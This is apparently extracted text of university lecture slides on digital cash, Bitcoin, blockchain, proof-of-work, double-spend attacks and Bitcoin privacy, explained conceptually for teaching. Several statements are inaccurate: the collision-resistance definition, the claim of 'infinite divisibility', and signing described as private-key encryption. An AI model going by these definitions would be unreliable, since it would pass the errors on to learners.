Bitcoin and Cryptocurrencies CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 491 -->

History of Banking/Payment System CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 492 -->

Money ➢ What is Money ▪ Coins, Bill – can’t exist on two places at one time ▪ Bearer bonds: immediate cashable ▪ Gold, Silver: portable money ➢ Features : ▪ Difficulty to counterfeit ▪ Immediate settle - able ▪ Untraceable. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 493 -->

Digital Cash ➢ Two types of Digital Cash ▪ Identified digital cash ▪ Anonymous digital cash ➢ Ideal Digital Cash system: ▪ Independency (transfer through network) ▪ Security (not copied or re - used) ▪ Privacy (untraceable) ▪ Offline payment (peer to peer) ▪ Transferability (to another person) ▪ Divisibility (digital cash can be divided into smaller amount) CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 494 -->

Digital Cash ➢ Digital cash is like other cash. ▪ We need to buy some initial digital coins with another form of money before we can spend them. ➢ Preventing forgery is harder because it is easier to duplicate a sequence of bits. ➢ Anonymity is harder since anything that happens online can leave a trace. ➢ The easiest ways of implementing digital cash is to use a trusted central authority. ▪ This has little advantage over just using a bank and credit and debit cards. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 495 -->

Protocol Consideration ➢ Consumer: ▪ Privacy ; Security; Protection; Regulation ➢ Business: ▪ Availability of anonymity; Cost and ease of acquisition; Availability; Risk of fraud; Liability for fraud. ➢ Financial And Government : ▪ Consumer protection; Financial loss; Privacy vs fighting crime; Federal reserve regarding the money. ➢ Technical Challenges : ▪ Anonymous spending; Privacy; Preventing fraud, like double spending; Cost effective CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 496 -->

David Chaum and DigiCash ➢ Blind Signature: to provide anonymity ▪ What a normal protocol looks like (using PKI) 1. Alice : sign for a note with money order + SerialNum 2. Bank: verify and sign the note + deduct her account 3. Alice use the note signed by bank to Bob for service or product 4. Bob verify bank signature, and send note to bank 5. Bank verify its signature and SerialNum not claimed before, put proper money into Bob’s account CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 497 -->

➢ Change above to provide anonymity 1. Alice: sign for a note with money order + SerialNu . Do this for 100 envelop for instance. Generating Anonymous by process of blinding. 2. Bank: verify the note by read 99 envelop (cut - and choose protocol, ask Alice to unblind those 99) + deduct her account + sign the last one without open 3. Alice use the note (by unblinding it) signed by bank to Bob for service or product. 4. Bob verify bank signature, and send note to bank 5. Bank verify its signature and SerialNum not claimed before, put proper money into Bob’s account. However, bank won’t know where the original money come from (it doesn’t know the SerialNum ) David Chaum and E - Cash CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 498 -->

➢ Prevent double - spending ▪ Bank needs to know who the double spender is: Alice or Bob? 1. Alice: sign for n notes with money order + SerialNum + Identity info pairs (identity pair using secrete splitting and bit commitment protocol) 2. Bank: ask Alice to unblind n - 1 notes and reveal identity; when satisfy, sign the last blind note. 3. Alice unblind the note and give to Bob 4. Bob verify bank signature 5. Bank verify its signature and SerialNum not claimed before, put proper money into Bob’s account. Detecting the culprit if SerialNum is re - used. David Chaum and E - Cash CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 499 -->

E - Cash Crypto Protocols ➢ Various practical issues: ▪ Need for trusted central party ▪ Computationally expensive ▪ Etc. CS660 - ADVANCED INFORMATION ASSURANCE - UMASSAMHERST 24 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 500 -->

Ideas of Cryptocurrencies ➢ They don’t have a central authority. ▪ They use a peer - to - peer system with all peers equal. ➢ This requires enough of the peers to agree on which transactions have happened. ▪ A ledger that can’t be altered. ▪ How are disagreements resolved? ➢ They also need techniques to prevent forgery and double spending. ➢ They should also prevent a denial - of - service attack ▪ So that someone is not prevented from spending their money. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 25


<!-- Page 501 -->

➢ A distributed , decentralized cryptocurrency system ➢ Effectively “ a bank ” run by an “ ad - hoc (peer - to - peer) network” ▪ Digital checks ▪ A distributed transaction log (i.e., ledger) ▪ Nodes running Bitcoin protocol (lightweight, full nodes ) ➢ Released by Satoshi Nakamoto 2008 What is Bitcoin CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 502 -->

Centralised ledger: ◦ Identity: sort - code/account number ◦ Authentication: physical bank card, internet/mobile banking account ◦ Transactions: verified and recorded (on to the ledger) by a commercial & central bank Distributed Ledger ◦ Identity : public - key (e.g., Bitcoin Address = hash of hash of public - key) ◦ Authentication : digital signature ◦ Transactions : verified and recorded (onto distributed ledger (i.e., Bitcoin blockchain) by participants in the network. Bitcoin vs Traditional (Centralised) Banking System CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 503 -->

Centralised Ledger Bitcoin distributed ledger: chain of block ( Blockchain ) Bitcoin vs Traditional (Centralised) Banking System CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 504 -->

➢ Motivation ◦ Distrust of financial institutions ◦ Avoid the control of the traditional banking system Any noncash transaction requires a trusted third - party administrator — commonly a bank or financial service provider. The system forces participants to trust financial institutions that are not always trustworthy. Why Bitcoin? CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 505 -->

CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Cryptography in Bitcoin


<!-- Page 506 -->

Key - pair : public - key and private - key ◦ In Bitcoin: Elliptic Curve Secp256k1 Public - key Cryptograph y CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 507 -->

➢ First , create a message digest using a cryptographic hash ➢ Then , encrypt the message digest with your private key → In Bitcoin Elliptic Curve Digital Signature Algorithm ( ECDSA , Secp256k1 ) with cryptographic hash ( SHA256 ) is used for authentication/transaction verification Authentication Integrity Non - repudiation CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Digital Signature Algorithm


<!-- Page 508 -->

33 Hash Fn Message of arbitrary length Fixed Size Message Diges t ▪ Consistent: hash(X) always yields same result ▪ Pre - image Resistance ( One - way): any given Y in the output space, hard to find X s.t. H(X) = Y ▪ Second Pre - image Resistance : For a given m essage X, it is hard to find Y s.t. X ≠ Y and H(X) = H(Y ) ▪ Collision resistance: given H(W) = Z, hard to find X such that H(X) = Z CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Cryptographic Hash Function SHA256


<!-- Page 509 -->

➢ A linked list is a basic data structure where a series of data blocks are linked together. ➢ Each block contains the ID of the next one in the chain. ➢ It is possible to get to all of the blocks if we start with a pointer to the first block in the list. ➢ If each block also contains a hash of the previous block then it is called a Block Chain. ➢ It is not possible to insert a block in the middle of the list. ▪ One of the hashes would disagree. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Linked List and Block Chains


<!-- Page 510 -->

35 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 511 -->

➢ A binary tree is like a linked list, but each block has pointers to two other blocks. ➢ In a sorted binary tree, the left and right linked blocks are in sorted order. ▪ Left before, right after. ➢ It is possible to find a block, or prove that a block is not in a sorted tree, much quicker than a linked list. ▪ Not all the blocks need to be checked. ➢ Each block in a binary tree can also contain the hashes of the two linked blocks. It is then called a Merkle tree. ▪ It is impossible to insert a block in the middle of the tree afterwards. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Data Structure: Binary and Merkle Tree


<!-- Page 512 -->

37 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 513 -->

Miner Developer P2P Network 1. How to perform secure decentralized payments in Bitcoin ? 2. How to exchange privacy - preserving payments? 3. How to make decentralized systems efficient ? CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Back to Bitcoin


<!-- Page 514 -->

Summary ► A big picture of digital cash and Bitcoin as a cryptocurrency ► Digital Cash, proposed by David Chaum ► Bitcoin vs Traditional Banking System vs Digital Cash ► Remind of some cryptographic functions used in Bitcoin ► Message Digest / Hash function ► Public key cryptography with Digital Signature CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 39


<!-- Page 515 -->

Quiz 1. What is the difference between a peer - to - peer network and a centralised network? What things are harder to do with a peer - to - peer network? 2. Why d o d i g it a l c o i ns h a ve a u n i que I D w h il e p o un d c o i ns d o n o t ? Is this similar to the unique ID on bank notes? 3. What is a cryptocurrency ledger and why is it important? 4. What is a blockchain and a Merkle tree? Why are they useful? CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 40


<!-- Page 516 -->

Bitcoin, Cryptocurrencies, and Blockchain technology 1. Bitcoin & Cryptocurrencies 2. Blockchain Technology 3. Security and Privacy in Bitcoin and Cryptocurrencies 1 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 517 -->

Outline 1. Bitcoin & Cryptocurrencies ◦ Decentralised Payment System: A Big Picture ◦ Cryptography in Bitcoin ◦ Bitcoin Protocol: an Overview 2. Bitcoin Protocol and Blockchain Technology ▪ Bitcoin Addresses ▪ Bitcoin Distributed Ledger: a Blockchain ▪ Transactions in Bitcoin and Blockchain ▪ Consensus Mechanism: Proof - of - Work 3. Security and Privacy in Bitcoin and Blockchain CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 518 -->

Miner Developer P2P Network 1. How to perform secure decentralized payments in Bitcoin ? 2. How to exchange privacy - preserving payments? 3. How to make decentralized systems efficient ? CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Back to Bitcoin


<!-- Page 519 -->

Bitcoin and Blockchain Technology CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 520 -->

Blockchain Technology 5 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://bitsonblocks.net/2015/09/09/a - gentle - introduction - to - blockchain - technology/ ➢ Blockchain is the technology behind Bitcoin ▪ Understanding How Bitcoin protocol is to understand Blockchain ➢ Bitcoin underpins Blockchain tech, but Blockchain goes further than only Bitcoin


<!-- Page 521 -->

Bitcoin Transaction Lifecycle 6 https://www.bambora.com/en/ca/blog/bitcoin - explained/ CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 522 -->

1. Bob opens his bitcoin wallet. 2. Bob wants to transfer bitcoins to Alice. He scans Laura’s bitcoin address. 3. Bob fills an amount of bitcoin he wants to transfer and the fee he is willing to pay AND form a transaction. 4. Before sending the new transaction to the blockchain, it is signed using Bob’s private key signs it. 5. Now, the transaction is sent to the closest node on the bitcoin network and propagated into the network and verified. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Bitcoin Transaction Lifecycle


<!-- Page 523 -->

6. It’s mining time and miners pick up the transactions and group them into blocks trying to solve the Proof - Of - Work. 7. The miner who get it propagates the new block to the network. 8. The nodes verify the result and propagate the block. 9. Now Laura sees the first confirmation. 10. 10. New confirmations appear with each new block that is created and linked. CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Bitcoin Transaction Lifecycle


<!-- Page 524 -->

Bitcoin Protocol 1. Bitcoin Addresses 2. Bitcoin Distributed Ledger: Bitcoin Blockchain 3. Bitcoin Transactions 4. Consensus Mechanism: Proof - of - Work CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 9


<!-- Page 525 -->

Bitcoin Address 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Each user owns a key pair ( pk,sk ) ➢ BTC address is generated from user’s public - key: ▪ Unique identifier ▪ Hash of hash of a public key F.Y.I: Total Balance < 21M BTC Satoshi == 10 - 8 Bitcoin 1 EGam2BeXd8sgphB44mE Y qnDyDszw4YTEr 3 J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy


<!-- Page 526 -->

Bitcoin Ledger: a Blockchain 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Bitcoin Ledger is a chain of blocks (i.e., Bitcoin blockchain) ➢ Each block contains Header and Transactions ➢ Nodes in the Bitcoin network are expected to store exactly the same ledger → reach the consensus


<!-- Page 527 -->

Bitcoin Ledger: a Blockchain 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://developer.bitcoin.org/devguide/block_chain.html


<!-- Page 528 -->

Bitcoin Transaction 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Data Types: Merkle Tree ▪ Root hash of the Merkle Tree is written in the header ▪ If any transaction is modified, then the Root hash is changed → resulting in the change of the hash of Block header. ➢ Hash Function SHA - 256 is used


<!-- Page 529 -->

Bitcoin Transaction 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Transaction: Alice transfers 0.25 BTC to Bob


<!-- Page 530 -->

Bitcoin Transaction 15 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Transaction Data Type: “Input”, “Output” and other parameters ➢ Input of the transaction is an output of another transaction. ▪ Alice needs to claim she has 1BTC by showing the output of another transaction (which is 1BTC) belong to her. ▪ To do that, Alice needs to use her private - key to generate her digital signature ➢ Outputs: Define conditions using a scripting system ▪ The conditions must be satisfied in order to spend the output in the next transactions. ▪ Digital signature is used to sign the transaction, and Elliptic Curve Digital Signature Algorithm ( secp256k1 ) is used


<!-- Page 531 -->

16 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Content of a Bitcoin transaction with 1 input and 2 outputs. Transaction verification using a scripting system


<!-- Page 532 -->

➢ Stack - based programming language ➢ If evals to true → Bitcoin transaction is valid ➢ Many opcodes defined ➢ Execution time is critical to prevent DoS attacks Example Script <signature>< publicKey > OP_CHECKSIG Bitcoin Scripting System 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK https://developer.bitcoin.org/reference/transactions.html Constants are pushed onto the stack Operation executed on stack values


<!-- Page 533 -->

Consensus Mechanism: Proof of Work 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Bitcoin is a “distributed ledger blockchain”, therefore: ▪ Information added to the ledger must be accurate and honest ▪ Entire network agrees with the ledger’s content ➢ A mechanism for all nodes in Bitcoin network to cooperate and reach to a common opinion (consensus): ▪ Reach agreement on adding blocks to the blockchain ▪ Keep all nodes in the network synchronized


<!-- Page 534 -->

Consensus Mechanism: Proof of Work 19 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Bitcoin requires that each block prove a significant amount of work was invested in its creation. ▪ This ensures that untrustworthy peers who want to modify past blocks have to work harder than honest peers who only want to add new blocks to the block chain. ➢ Chaining blocks together makes it impossible to modify transactions included in any block without modifying all subsequent blocks. ▪ The cost to modify a particular block increases with every new block added to the block chain, magnifying the effect of the proof of work.


<!-- Page 535 -->

Consensus Mechanism: Proof of Work 20 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ Nonce? ▪ Number only used once ➢ Some nodes in the Bitcoin network try to find Nonce N, s.t. : ➢ This process is known as “mining”, and the nodes are “miners”


<!-- Page 536 -->

Proof of Work: Example 21 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Hash(Hash(B 3 )| txs|N ) < target = 0x000** Hash(Block_ 3 | merkle_root | 0 xbeed) = 0 x 03 ef .. Hash(Block_ 3 | merkle_root | 0 xbeee) = 0 x 12 ef .. Hash(Block_ 3 | merkle_root | 0 xbeef) = 0 x 000 f .. This miner successfully find the Nonce, as a result correctly form a new block. He claims his work by broadcasting this block to the network The verification is easy. But Proof - of - Work is hard.


<!-- Page 537 -->

Proof of Work: Example 22 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Hash(Hash(B 3 )| txs|N ) < target = 0x000** This miner successfully find the Nonce, as a result correctly form a new block. He claims his work by broadcasting this block to the network


<!-- Page 538 -->

Bitcoin Protocol: Update Rules and Forks 23 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK ➢ What happens if some miners successfully calculate “Nonce” and broadcast their own new block to the network ▪ Network partition ▪ Fork ▪ Soft - fork: temporary ▪ Hard - fork: permanent ➢ Update Rule: ▪ Longest chain wins


<!-- Page 539 -->

CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 24 Block 4 Block 4 ’ Block 4 ’’ Successful Miner A Successful Miner B Successful Miner C Block 4’ Block 4 Block 4 ’’ Node X Node Y


<!-- Page 540 -->

25 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Eventually all the nodes will have a same blockchain (the longest one).


<!-- Page 541 -->

Summary We have learned about the Bitcoin Protocol, which underpins the Blockchain technology ➢ Bitcoin Addresses ➢ Bitcoin Distributed Ledger: a chain of Blocks ➢ Transactions in Bitcoin and Blockchain ➢ Consensus Mechanism: Proof - of - Work CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 26


<!-- Page 542 -->

Quiz 6. What cryptographic algorithms are used by bitcoin? 7. In a transaction 1 - input 2 - ouput, one output belongs to Bob, whose is another output? 8. What is distributed consensus and how is it achieved with bitcoin? 9. Why Proof - of - Work is hard but easy to verify? CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 27


<!-- Page 543 -->

Bitcoin, Cryptocurrencies, and Blockchain Technology 1. Bitcoin & Cryptocurrencies 2. Blockchain Technology 3. Security and Privacy in Bitcoin and Cryptocurrencies 1 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 544 -->

Outline 1. Bitcoin & Cryptocurrencies ◦ Decentralised Payment System: A Big Picture ◦ Cryptography in Bitcoin ◦ Bitcoin Protocol: an Overview 2. Blockchain Technology § Bitcoin Addresses § Bitcoin Distributed Ledger: a Blockchain § Transactions in Bitcoin and Blockchain § Consensus Mechanism: Proof - of - Work 3. Security and Privacy in Bitcoin and Blockchain CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 2


<!-- Page 545 -->

Security and Privacy in Bitcoin CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 546 -->

Security in Bitcoin 4 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Authentication à Public Key Crypto & Digital Signatures § Am I paying the right person? Not some other impersonator? Ø Availability à Broadcast messages to the P2P network § Can I make a transaction anytime I want? Ø Integrity à Digital Signatures & Cryptographic Hash § Is the coin double - spent? § Can an attacker reverse or change transactions? Ø Confidentiality à Pseudonymity § Are my transactions private? Anonymous?


<!-- Page 547 -->

Mining: The Guardian of the Bitcoin Network 5 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Mining, beyond generating new bitcoin, validates and embeds transactions into the blockchain . Ø This Proof - of - Work process is pivotal, requiring substantial computational resources and underpinning the network’s security.


<!-- Page 548 -->

Proof - of - Work: Bitcoin Hash - rate 6 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 549 -->

Proof - of - Work: Bitcoin Difficulty 7 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 550 -->

Transaction Finality 8 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Finality is the guarantee that past transactions can never change . Ø Bitcoin system only offers probabilistic transaction finality - that transactions are not immediately final but become so eventually.


<!-- Page 551 -->

Double - Spend in Bitcoin CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 552 -->

Why Proof of Work? 10 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Why do we need to use an extremely resource - intensive computation for “Nonce” § F.Y.I: Bitcoin currently consumes around 110 Terawatt Hours per year — 0.55% of global electricity production* (2021) § From CPU to GPU to ASICs Ø Integrity: To prevent from transaction alteration/reverse and Double - spend. § Intuitively, to change/reverse Tx, a malicious miner needs to re - compute nonce for several blocks while racing with other honest miners for new block à nearly impossible * https://ccaf.io/cbeci/index


<!-- Page 553 -->

Why Proof of Work? 11 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 554 -->

Double - Spend in Bitcoin 12 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Double - spending problem is the successful use of the same funds twice. Ø Here is the strategy for attacker performing double - spend attack: Attacker Victim V Attacker


<!-- Page 555 -->

Double - Spend in Bitcoin 13 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Attacker makes a transaction transferring its money to victim V (transaction X). Ø Attacker makes another transaction transferring this money to its (another) address (transaction Y) § Secretly mining using the block that includes transaction Y. Ø Wait for the transaction X to be confirmed and included in a new block à Victim V hands over his goods, sure that the money is finally appropriated to him.


<!-- Page 556 -->

Double - Spend in Bitcoin 14 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø The attacker then broadcasts the block he mined which contains the transaction Y à creates a fork Ø And continues to mine this alternative branch (i.e., fork) and successfully mine another block appended to this fork à broadcast to the network Ø Since the new branch is longer than all other known, it will be considered valid, and BTC transfer to the victim V will be replaced by sending coins to the attacker.


<!-- Page 557 -->

Double - Spend in Bitcoin 15 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Double - spend attack: a race between attackers (malicious miners) and honest miners. Ø Basically, to be successful in the double - spend attack, the attackers need to control > 50% computation power of the whole Bitcoin network (i.e., 51% attack) § This is practically impossible.


<!-- Page 558 -->

Decentralisation in Bitcoin CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 559 -->

Bitcoin Mining Pools 17 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Mining Pools: § Probability of finding a block alone is very small § Unite in Mining pools § Payout is done proportional to the work § What if the mining pools collude and carry out double - spend attack?


<!-- Page 560 -->

Full nodes across the Glob e 18 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Tens of thousands of nodes spread across the globe — Source: Bitnodes.io


<!-- Page 561 -->

Privacy in Bitcoin: Pseudonymity CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 562 -->

Definitions Ø A transaction is “ anonymous ” if no one knows who you are. Ø A transaction is “ private ” if what you purchased, and for what amount, are unknown CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK 20


<!-- Page 563 -->

Bitcoin Privacy: Pseudonymity 21 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Bitcoin is assumed to be anonymous § As Bitcoin addresses are as random string of characters (hash of hash of a public - key) Ø But not private § Identities are not revealed in the blockchain – but every transaction is visible in the blockchain. Ø Anonymity is attractive – but also a challenge for financial regulation that seeks to prevent money laundering


<!-- Page 564 -->

Bitcoin Privacy: Pseudonymity 22 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Even Bitcoin is anonymous, there is a way to de - anonymise Ø This is called “transaction graph analysis” Ø What’s wrong here? § Alice BTC relates to each other due to the definition of transactions (e.g., multiple inputs, change addresses) § Combined with other side - information or low - layer network information (e.g., IP addresses) in the Bitcoin network § There is a change of figuring out the real identity of BTC owners.


<!-- Page 565 -->

Bitcoin Privacy: Pseudonymity 23 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 566 -->

Bitcoin Fungibility 24 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø What Is Fungibility ? § Fungibility is a property of goods whose units are interchangeable . § A good is fungible if one unit of the good always carries the exact same value as all other units of the good . § Fiat currency: GBP notes? § Is Bitcoin Fungible? Ø Fungibility is critical to preserving Bitcoin’s censorship resistance and privacy . § Goods which are not fungible or divisible serve as poor monetary goods. Bitcoin has infinite divisibility and strong fungibility .


<!-- Page 567 -->

Bitcoin Privacy: Solutions 25 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK Ø Some solutions : § Mixer, JoinCoin , k - anonymity Privacy, N - anonymity Privacy, Zero - Knowledge - Proof (ZKP) § This is the task for you to explore!


<!-- Page 568 -->

Bitcoin Privacy: Solutions Bitcoin Mixing Service 26 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 569 -->

Bitcoin Privacy: Solutions Coin - Join 27 CRYPTOGRAPHY AND SECURE DEVELOPMENT DR. NGUYEN TRUONG: NGUYEN.TRUONG@GLASGOW.AC.UK


<!-- Page 570 -->

